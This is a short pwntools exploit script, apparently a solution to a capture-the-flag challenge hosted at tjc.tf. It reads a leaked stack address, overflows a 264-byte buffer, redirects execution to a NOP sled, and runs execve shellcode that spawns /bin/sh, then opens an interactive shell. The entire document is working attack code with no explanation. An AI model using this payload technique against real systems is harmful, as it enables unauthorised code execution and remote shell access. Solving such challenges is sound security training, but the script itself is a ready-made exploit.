from pwn import *

# io = process("./chall")
io = remote("tjc.tf", 31365)

leak = int(io.recvline(), 16)
info("stack: " + hex(leak))

context.binary = ELF("./chall")
shellcode = b"\x50\x48\x31\xD2\x48\xC7\xC6\x00\x00\x00\x00\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x0F\x05"

payload =  b"a" * 264 + p64(leak + 264 + 8)
payload += asm("nop") * 0x10
payload += shellcode

io.sendline(payload)    
io.interactive()